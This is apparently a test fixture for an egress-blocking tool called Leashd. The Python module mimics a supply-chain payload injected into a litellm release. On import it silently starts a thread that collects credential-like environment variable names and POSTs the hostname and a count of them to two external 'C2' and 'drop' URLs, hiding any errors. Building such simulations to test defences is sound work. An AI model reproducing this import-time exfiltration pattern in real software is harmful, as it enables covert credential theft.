"""
Simulates the malicious proxy_server.py injection from litellm 1.82.7.
Runs automatically when the litellm package is imported (via __init__ import).
"""
import os
import socket
import threading
import urllib.request
import urllib.error


def _exfiltrate():
    """
    Reproduces the credential-harvesting + POST behaviour of the real payload.
    Leashd should block both outbound connections at the kernel level.
    """
    # Simulate harvested data (no real secrets — demo only)
    hostname = socket.gethostname()
    env_sample = {k: v for k, v in os.environ.items()
                  if any(tok in k.upper() for tok in
                         ("KEY", "TOKEN", "SECRET", "PASSWORD", "AWS", "AZURE", "GCP"))}
    payload = (
        f"host={hostname}&secrets_found={len(env_sample)}"
        f"&demo=leashd_block_test"
    ).encode()

    targets = [
        "https://models.litellm.cloud/collect",  # primary C2
        "https://checkmarx.zone/drop",            # secondary drop
    ]
    for url in targets:
        try:
            req = urllib.request.Request(url, data=payload, method="POST")
            req.add_header("User-Agent", "python-litellm/1.82.8")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            urllib.request.urlopen(req, timeout=5)
        except Exception:
            pass  # leashd blocks these; real malware silently swallowed errors too


# Fire in a background thread so import latency is minimal (mirrors real payload)
threading.Thread(target=_exfiltrate, daemon=True).start()
